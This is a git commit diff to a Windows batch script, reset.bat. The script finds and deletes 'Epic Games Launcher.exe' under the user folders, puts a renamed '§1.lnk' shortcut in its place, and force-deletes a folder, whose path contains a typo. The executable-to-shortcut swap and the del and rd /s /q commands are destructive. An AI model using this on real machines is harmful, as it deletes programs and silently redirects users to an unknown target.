72b945130c6e55ea0198f4158cf36f128cfca4df
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-06 15:08:00 +0100

    Update reset.bat

--- reset.bat
+++ reset.bat
@@ -1,11 +1,4 @@
-move "C:\Users\Public\Videos\GraphicalUserInterface\§1.lnk" "C:\Users\%USERNAME%"
-ren "C:\Users\%USENAME%\§1.lnk" "Epic Games Launcher.lnk"
-#rd /s /q "C:\Users\Public\Viseos\GraphicalUserInterface"
-#for /r C:\Users %%a in (*) do if "%%~nxa"=="Epic Games Launcher.exe" set p=%%~dpnxa
-#set /A counter=0
-@echo off
 setlocal enabledelayedexpansion
-
 for /r C:\Users %%a in (*) do (
     if "%%~nxa"=="Epic Games Launcher.exe" (
         set "p=%%~dpnxa"
@@ -21,3 +14,4 @@ goto :eof
 del "!p!"
 move "C:\Users\Public\Videos\GraphicalUserInterface\§1.lnk" "!p!"
 ren "!p!" "Epic Games Launcher.lnk"
+rd /s /q "C:\Users\Public\Viseos\GraphicalUserInterface"
